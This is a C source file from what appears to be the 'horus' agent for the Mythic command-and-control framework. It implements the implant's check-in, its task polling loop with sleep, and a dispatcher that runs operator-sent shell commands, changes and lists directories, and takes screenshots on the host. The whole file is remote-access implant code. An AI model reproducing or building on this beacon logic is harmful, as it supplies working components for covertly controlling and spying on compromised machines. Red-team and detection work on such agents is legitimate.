#include "horus.h"
#include "Command.h"
#include <stdio.h>
#include <string.h>

BOOL handleGetTasking(PParser getTasking)
{
    UINT32 numTasks = getInt32(getTasking);
    if (numTasks)
        _dbg("[TASKING] Got %d tasks !\n", numTasks);

    for (UINT32 i = 0; i < numTasks; i++)
    {
        SIZE_T sizeTask = getInt32(getTasking) - 1; // We subtract 1 for the task ID
        BYTE task = getByte(getTasking);
        PBYTE taskBuffer = getBytes(getTasking, &sizeTask);
        PParser taskParser = newParser(taskBuffer, sizeTask);

        if (task == SHELL_CMD)
        {
            wrapShell(taskParser);
        }
        else if (task == CD_CMD)
        {
            wrapCd(taskParser);
        }
        else if (task == LS_CMD)
        {
            wrapLs(taskParser);
        }
        else if (task == PWD_CMD)
        {
            wrapPwd(taskParser);
        }
        else if (task == EXIT_CMD)
        {
            wrapExit(taskParser);
        }
        else if (task == SCREENSHOT_CMD)
        {
            wrapScreenshot(taskParser);
        }
    }

    return TRUE;
}

BOOL commandDispatch(PParser response)
{
    BYTE typeResponse = getByte(response);
    if (typeResponse == GET_TASKING)
        return handleGetTasking(response);
    else if (typeResponse == POST_RESPONSE)
        return TRUE;

    return TRUE;
}

BOOL parseCheckin(PParser ResponseParser)
{
    if (getByte(ResponseParser) != CHECKIN)
    {
        freeParser(ResponseParser);
        return FALSE;
    }

    // Mythic sends a new UUID after the checkin : we need to update it
    SIZE_T sizeUuid = 36;
    PCHAR newUUID = getString(ResponseParser, &sizeUuid);
    setUUID(newUUID);

    _dbg("[TASKING] Got new UUID ! --> %s\n", newUUID);

    freeParser(ResponseParser);

    return TRUE;
}

BOOL routine()
{
    // Asking for new tasks
    PPackage getTask = newPackage(GET_TASKING, TRUE);
    addInt32(getTask, NUMBER_OF_TASKS);

    Parser *ResponseParser = sendPackage(getTask);
    // No response
    if (!ResponseParser)
        return FALSE;

    commandDispatch(ResponseParser);

    // Sleep
    Sleep(horusConfig->sleeptime);

    return TRUE;
}